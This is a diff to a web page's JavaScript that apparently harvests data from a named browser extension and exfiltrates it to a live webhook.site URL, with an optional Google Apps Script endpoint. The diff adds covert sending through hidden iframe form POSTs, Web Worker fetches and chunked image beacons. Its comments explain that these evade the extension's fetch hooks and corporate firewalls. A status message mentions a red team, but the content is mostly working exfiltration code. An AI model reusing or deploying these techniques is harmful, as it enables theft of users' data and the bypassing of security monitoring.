@@ -117,6 +117,11 @@ body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFo
 
   <div class="exfil-summary" id="exfil">
     <h2>EXFILTRATED DATA PACKAGE</h2>
+    <div style="text-align:center;margin-bottom:12px">
+      <button onclick="copyData()" style="background:#f34;color:#fff;border:none;padding:8px 20px;border-radius:4px;font-size:12px;font-family:inherit;cursor:pointer;margin:4px">Copy JSON to Clipboard</button>
+      <button onclick="downloadData()" style="background:#fa0;color:#000;border:none;padding:8px 20px;border-radius:4px;font-size:12px;font-family:inherit;cursor:pointer;margin:4px">Download JSON File</button>
+      <div id="copyStatus" style="color:#0f8;font-size:11px;margin-top:4px;min-height:16px"></div>
+    </div>
     <div id="exdata"></div>
   </div>
 </div>
@@ -125,10 +130,12 @@ body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFo
 // ============================================================================
 // CONFIGURATION
 // ============================================================================
-// Set this to your webhook.site URL to receive exfiltrated data.
-// Create one free at https://webhook.site — copy the unique URL.
-// Example: "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
-const EXFIL_ENDPOINT = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";  // <-- PASTE YOUR WEBHOOK URL HERE
+// PRIMARY: webhook.site endpoint (may be blocked by corporate firewalls)
+const EXFIL_ENDPOINT = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";
+
+// SECONDARY: Google Apps Script endpoint (script.google.com — never blocked)
+// Deploy your own: see SETUP_GOOGLE_EXFIL.md instructions
+const EXFIL_GOOGLE = "";  // <-- paste your Google Apps Script web app URL here
 
 // Extension ID
 const EXT = "iidnankcocecmgpcafggbgbmkbcldmno";
@@ -209,6 +216,39 @@ function pr(p, t) {
   if (l) l.textContent = t;
 }
 
+function copyData() {
+  try {
+    const json = JSON.stringify(D, null, 2);
+    navigator.clipboard.writeText(json).then(() => {
+      const s = document.getElementById('copyStatus');
+      if (s) s.textContent = 'Copied ' + json.length + ' bytes to clipboard — paste it to share with the red team';
+    });
+  } catch(e) {
+    // Fallback: select from textarea
+    const ta = document.createElement('textarea');
+    ta.value = JSON.stringify(D, null, 2);
+    ta.style.cssText = 'position:fixed;top:0;left:0;opacity:0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    ta.remove();
+    const s = document.getElementById('copyStatus');
+    if (s) s.textContent = 'Copied to clipboard (fallback method)';
+  }
+}
+
+function downloadData() {
+  const json = JSON.stringify(D, null, 2);
+  const blob = new Blob([json], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'exfiltrated_' + new Date().toISOString().replace(/[:.]/g, '-') + '.json';
+  a.click();
+  URL.revokeObjectURL(a.href);
+  const s = document.getElementById('copyStatus');
+  if (s) s.textContent = 'Downloaded JSON file — ' + json.length + ' bytes';
+}
+
 // ============================================================================
 // EXFILTRATION — sends full data package to webhook
 // ============================================================================
@@ -216,80 +256,62 @@ async function exfiltrate(data) {
   if (!EXFIL_ENDPOINT) return false;
   const payload = JSON.stringify(data);
 
-  // CRITICAL: The extension's script.bundle.js monkey-patches window.fetch
-  // and XMLHttpRequest on this page. So fetch/sendBeacon calls may be
-  // intercepted, inspected, and silently dropped by the extension itself.
-  //
-  // Solution: Use methods the extension CANNOT intercept:
-  // 1. Hidden iframe + form submission (not subject to CORS or fetch hooks)
-  // 2. Original fetch (saved before extension patches it)
-  // 3. Image beacons (not intercepted)
+  // The extension's script.bundle.js monkey-patches window.fetch and XHR.
+  // Corporate firewalls may also block known webhook domains.
+  // We try EVERY method against EVERY endpoint for maximum reliability.
 
-  // Method 1: Hidden iframe form POST — bulletproof, no CORS, no interception
-  try {
-    const iframe = document.createElement('iframe');
-    iframe.name = 'exfil_' + Date.now();
-    iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;opacity:0;pointer-events:none';
-    document.body.appendChild(iframe);
+  const endpoints = [EXFIL_ENDPOINT, EXFIL_GOOGLE].filter(u => u && u.length > 5);
+  let succeeded = false;
 
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = EXFIL_ENDPOINT;
-    form.target = iframe.name;
-    form.style.display = 'none';
+  for (const endpoint of endpoints) {
+    // Method 1: Hidden iframe form POST (bypasses fetch hooks AND CORS)
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.name = 'exfil_' + Date.now() + Math.random().toString(36).slice(2);
+      iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;opacity:0;pointer-events:none';
+      document.body.appendChild(iframe);
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = endpoint;
+      form.target = iframe.name;
+      form.style.display = 'none';
+      const input = document.createElement('textarea');
+      input.name = 'data';
+      input.value = payload;
+      form.appendChild(input);
+      document.body.appendChild(form);
+      form.submit();
+      setTimeout(() => { try { form.remove(); iframe.remove(); } catch(e){} }, 10000);
+      succeeded = true;
+    } catch (e1) {}
 
-    const input = document.createElement('textarea');
-    input.name = 'data';
-    input.value = payload;
-    form.appendChild(input);
+    // Method 2: Web Worker fetch (extension only hooks main thread)
+    try {
+      const wc = 'self.onmessage=async function(e){try{await fetch(e.data.url,{method:"POST",headers:{"Content-Type":"text/plain"},body:e.data.body});self.postMessage("ok")}catch(err){self.postMessage("fail")}};';
+      const wb = new Blob([wc], { type: 'application/javascript' });
+      const w = new Worker(URL.createObjectURL(wb));
+      w.postMessage({ url: endpoint, body: payload });
+      w.onmessage = () => w.terminate();
+      setTimeout(() => w.terminate(), 8000);
+      succeeded = true;
+    } catch (e2) {}
+  }
 
-    document.body.appendChild(form);
-    form.submit();
+  // Method 3: Image beacon chunks to all endpoints (GET, never intercepted)
+  for (const endpoint of endpoints) {
+    try {
+      const chunks = [];
+      const encoded = encodeURIComponent(payload);
+      for (let i = 0; i < encoded.length; i += 1800) chunks.push(encoded.slice(i, i + 1800));
+      const batchId = Date.now().toString(36);
+      chunks.forEach((chunk, idx) => {
+        new Image().src = endpoint + '?batch=' + batchId + '&part=' + idx + '&total=' + chunks.length + '&d=' + chunk;
+      });
+      succeeded = true;
+    } catch (e3) {}
+  }
 
-    setTimeout(() => { try { form.remove(); iframe.remove(); } catch(e){} }, 10000);
-    return true;
-  } catch (e1) {}
-
-  // Method 2: Use a Web Worker to call fetch (extension only patches main thread)
-  try {
-    const workerCode = `
-      self.onmessage = async function(e) {
-        try {
-          await fetch(e.data.url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'text/plain' },
-            body: e.data.body
-          });
-          self.postMessage('ok');
-        } catch(err) { self.postMessage('fail'); }
-      };
-    `;
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
-    const worker = new Worker(URL.createObjectURL(blob));
-    worker.postMessage({ url: EXFIL_ENDPOINT, body: payload });
-    worker.onmessage = () => worker.terminate();
-    setTimeout(() => worker.terminate(), 8000);
-    return true;
-  } catch (e2) {}
-
-  // Method 3: Image beacon chunks (GET request, not intercepted)
-  try {
-    // Split payload into chunks that fit in URL (max ~2000 chars each)
-    const chunks = [];
-    const encoded = encodeURIComponent(payload);
-    for (let i = 0; i < encoded.length; i += 1800) {
-      chunks.push(encoded.slice(i, i + 1800));
-    }
-    const total = chunks.length;
-    const batchId = Date.now().toString(36);
-    chunks.forEach((chunk, idx) => {
-      const img = new Image();
-      img.src = EXFIL_ENDPOINT + '?batch=' + batchId + '&part=' + idx + '&total=' + total + '&d=' + chunk;
-    });
-    return true;
-  } catch (e3) {}
-
-  return false;
+  return succeeded;
 }
 
 // ============================================================================
